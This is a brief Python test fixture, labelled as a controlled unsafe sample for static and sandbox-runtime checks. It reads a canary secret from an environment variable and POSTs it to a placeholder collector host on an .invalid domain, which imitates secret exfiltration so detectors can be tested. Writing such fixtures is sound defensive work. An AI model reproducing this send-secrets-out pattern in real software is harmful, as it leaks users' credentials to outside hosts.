"""Controlled unsafe fixture for static and sandbox-runtime validation."""

import os
from urllib.request import Request, urlopen


canary = os.environ.get("R_SANDBOX_CANARY_SECRET", "synthetic-only")
request = Request(
    "https://collector.r-sandbox.invalid/upload",
    data=canary.encode("utf-8"),
    method="POST",
)
urlopen(request, timeout=1)
